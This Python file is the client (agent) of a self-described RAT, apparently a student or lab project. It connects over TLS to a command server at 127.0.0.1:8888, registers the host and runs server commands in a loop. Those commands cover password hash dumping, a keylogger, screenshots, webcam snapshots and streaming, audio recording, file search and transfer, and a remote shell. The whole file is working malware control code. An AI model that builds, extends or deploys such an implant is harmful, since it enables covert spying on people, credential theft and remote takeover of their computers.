"""
RAT Client (agent) - Remote Administration Tool.

Connects to the server via a TLS-encrypted TCP socket.
Executes received commands and sends back the results.
Compatible with Windows and Linux.
"""

import platform
import socket

from rat_project.common.protocol import decode_message, encode_message
from rat_project.common.tls import create_client_ssl_context
from rat_project.utils.logger_config import setup_logger

HOST = "127.0.0.1"
PORT = 8888

logger = setup_logger("client")


# ---------------------------------------------------------------------------
# Registration
# ---------------------------------------------------------------------------


def build_registration_payload() -> dict[str, str]:
    """
    Builds the registration message sent to the server on connection.

    Returns:
        dict: Payload with hostname, OS and release version.
    """
    return {
        "type": "register",
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "release": platform.release(),
    }


# ---------------------------------------------------------------------------
# Command dispatch
# ---------------------------------------------------------------------------


def handle_server_command(message: dict, conn: socket.socket) -> dict | None:
    """
    Routes a command received from the server to the appropriate function.

    Shell, download and upload commands handle their own
    communication with the server and return None.

    Args:
        message: Decoded message received from the server.
        conn: TLS socket for commands with multiple exchanges.

    Returns:
        Response dict to send to the server, or None if already handled.
    """
    from rat_project.client import client_actions_os as actions

    command = message.get("command")
    logger.info("Command received: %s", command)

    if command == "sysinfo":
        return {"type": "command_result", "command": "sysinfo", "output": actions.get_system_info()}

    elif command == "ipconfig":
        return {"type": "command_result", "command": "ipconfig", "output": actions.get_ipconfig()}

    elif command == "screenshot":
        data = actions.take_screenshot()
        return {"type": "command_result", "command": "screenshot", "data": data, "output": "Screenshot pris."}

    elif command == "search":
        filename = message.get("filename", "")
        return {"type": "command_result", "command": "search", "output": actions.search_file(filename)}

    elif command == "hashdump":
        return {"type": "command_result", "command": "hashdump", "output": actions.hashdump()}

    elif command == "keylogger":
        return {"type": "command_result", "command": "keylogger", "output": actions.toggle_keylogger()}

    elif command == "webcam_snapshot":
        data = actions.webcam_snapshot()
        return {
            "type": "command_result",
            "command": "webcam_snapshot",
            "data": data,
            "output": "Snapshot webcam pris.",
        }

    elif command == "webcam_stream":
        actions.webcam_stream(conn)
        return None

    elif command == "record_audio":
        duration = message.get("duration", 5)
        data = actions.record_audio(duration=duration)
        return {
            "type": "command_result",
            "command": "record_audio",
            "data": data,
            "output": "Audio enregistré.",
        }

    elif command == "download":
        path = message.get("path", "")
        return actions.handle_download(path)

    elif command == "upload":
        return actions.handle_upload(message)

    elif command == "shell_start":
        actions.handle_shell(conn)
        return None

    else:
        logger.warning("Unknown command: %s", command)
        return {"type": "command_result", "command": command or "unknown", "output": "Unknown command."}


# ---------------------------------------------------------------------------
# Main client loop
# ---------------------------------------------------------------------------


def run_client() -> None:
    """
    RAT client entry point.

    Connects to the server over TLS, sends the registration message,
    then waits for and executes commands in a loop.
    """
    ssl_context = create_client_ssl_context()

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw_socket:
            with ssl_context.wrap_socket(raw_socket, server_hostname=HOST) as client_socket:
                client_socket.connect((HOST, PORT))
                logger.info("Connected to server %s:%s (TLS)", HOST, PORT)

                # Registration
                payload = build_registration_payload()
                client_socket.sendall(encode_message(payload))
                logger.info("Registration sent: %s", payload)

                # Acknowledgement
                data = client_socket.recv(4096)
                ack = decode_message(data.decode("utf-8").strip())
                logger.info("ACK received: %s", ack)

                # Main loop
                while True:
                    data = client_socket.recv(65536)

                    if not data:
                        logger.info("Server disconnected.")
                        break

                    server_message = decode_message(data.decode("utf-8").strip())
                    logger.info("Message received: %s", server_message)

                    response = handle_server_command(server_message, client_socket)

                    if response is not None:
                        client_socket.sendall(encode_message(response))
                        logger.info("Response sent for: %s", response.get("command"))

    except Exception as exc:
        logger.exception("Client error: %s", exc)


if __name__ == "__main__":
    run_client()
